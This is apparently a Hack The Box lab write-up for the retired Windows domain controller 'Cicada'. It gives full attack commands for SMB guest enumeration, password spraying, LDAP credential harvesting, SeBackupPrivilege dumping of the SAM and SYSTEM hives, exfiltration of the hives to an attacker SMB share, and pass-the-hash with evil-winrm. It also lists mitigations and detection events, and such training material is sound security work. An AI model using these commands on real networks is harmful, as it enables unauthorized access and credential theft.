---
machine: Cicada
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, smb, password-spray, sebackupprivilege, pass-the-hash]
---

# Cicada — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

The domain controller exposes SMB with guest access and the `HR` share holds an onboarding notice with the company **default password**. A spray against the RID-enumerated users validates `michael.wrightson`; his LDAP read reveals `david.orelious`'s password in the `description` attribute, and `david` can read the `DEV` share, where `Backup_script.ps1` carries `emily.oscars`'s credentials in clear text. Emily is in `Remote Management Users` and `Backup Operators`: with WinRM and `SeBackupPrivilege` the `SAM`/`SYSTEM` hives are saved, the local Administrator hash is extracted and pass-the-hash gets the box.

## Recon

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV <IP> -oN nmap_svc.txt
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: cicada.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ssl/ldap
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Host `CICADA-DC`, domain `cicada.htb`. SMB signing is on, so relay is not the path: this box is about credentials, not network tricks.

```bash
echo "<IP> cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Unauthenticated SMB. Depending on the instance `anonymous` is rejected but **`guest` with an empty password** gets in; what stays constant is that `HR` is readable:

```bash
smbclient -L //<IP> -N
smbclient //<IP>/HR -N
```

Inside is `Notice from HR.txt`, a welcome note that includes the initial password handed to new employees. That is the datum that turns a boring share into a spray.

Unauthenticated RID enumeration:

```bash
impacket-lookupsid cicada.htb/guest@<IP> -no-pass
```

Out come `john.smoulder`, `sarah.dantelia`, `michael.wrightson`, `david.orelious` and `emily.oscars`.

```bash
nxc smb <IP> -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
```

The default password is still valid for **`michael.wrightson`**: nobody changed it. Michael is not in `Remote Management Users`, but he can read LDAP:

```bash
ldapsearch -x -H ldap://<IP> -D 'michael.wrightson@cicada.htb' -w '<PASSWORD>' \
  -b 'DC=cicada,DC=htb' '(objectClass=user)' sAMAccountName description
```

`david.orelious`'s `description` holds his password ("in case I forget it"). David has READ on the `DEV` share:

```bash
smbclient //<IP>/DEV -U 'david.orelious%<PASSWORD>'
```

There sits `Backup_script.ps1`, with **`emily.oscars`**'s credentials embedded. Emily belongs to `Remote Management Users` (WinRM) and `Backup Operators`.

## Foothold

```bash
nxc winrm <IP> -u emily.oscars -p '<PASSWORD>'
evil-winrm -i <IP> -u emily.oscars -p '<PASSWORD>'
```

Three chained credentials, all in clear text in legitimate resources: the pattern repeats in any AD audit with HR shares and backup scripts.

## Lateral movement

There is no second host: the DC itself is the target. The "movement" is vertical, from domain user to controller administrator.

## Privilege escalation

```powershell
whoami /priv
whoami /groups
```

Emily has `SeBackupPrivilege` and `SeRestorePrivilege` **enabled** through `Backup Operators`. That privilege opens files bypassing ACLs (it exists for backups), and with it the registry hives are copied:

```powershell
mkdir C:\Temp
reg save hklm\sam C:\Temp\sam /y
reg save hklm\system C:\Temp\system /y
reg save hklm\security C:\Temp\security /y
```

```bash
impacket-smbserver share /tmp/share -smb2support
# from the WinRM session:
# copy C:\Temp\sam \\<LHOST>\share\sam
impacket-secretsdump -sam sam -system system -security security LOCAL
```

The DC local Administrator NTLM hash is used directly:

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

Equivalent variant: `diskshadow` to expose `C:` and copy `C:\Windows\NTDS\ntds.dit` with the same trick; `secretsdump -ntds ntds.dit -system system LOCAL` yields the same hash. The `SAM`/`SYSTEM` route is shorter and touches less of the system.

## Evidence

- Trimmed output from `whoami /priv`, `reg save` and `secretsdump`.
- No flags, hashes or passwords: real values live in `private/`.

## Lessons learned

- An HR share with the onboarding password guarantees a spray: people do not change it.
- The spray needs a user list; `lookupsid` provides one unauthenticated and without tripping lockout if spaced out.
- `description` and `info` are the two LDAP attributes that leak passwords most often.
- `Backup Operators` does not "just do backups": with `SeBackupPrivilege` the hives are readable and the whole domain falls.
- If `anonymous` fails, try `guest` with an empty password before writing SMB off.

## Mitigations and detection

- Random initial password per user and force a change at first logon.
- Remove `Backup Operators` from human accounts; if required, use a managed account (gMSA) with auditing.
- Restrict reading `description`/`info` to administrators (attribute-level ACL) and review its content.
- Detection: many 4625 followed by a 4624 in the same window (4625 with `Sub Status 0xc000006a`), bulk share reads by a plain user, `reg save hklm\sam` (4688 with that command line or Sysmon 1) and `SeBackupPrivilege` use (4672 + 4656 on the hives).
- Disable guest SMB and drop the `HR` share from the DC root.

MITRE: T1078 (valid accounts), T1110.003 (password spraying), T1552.001 (credentials in files), T1003.002 (SAM), T1550.002 (pass the hash).

## References

- <https://www.hackthebox.com/machines/cicada>
- <https://benheater.com/hackthebox-cicada>
- <https://chaelsoo.me/writeups/htb-cicada>
- <https://certifa.net/writeups/htb-cicada>
- <https://learn.microsoft.com/en-us/windows-server/security/kerberos/backup-operators>
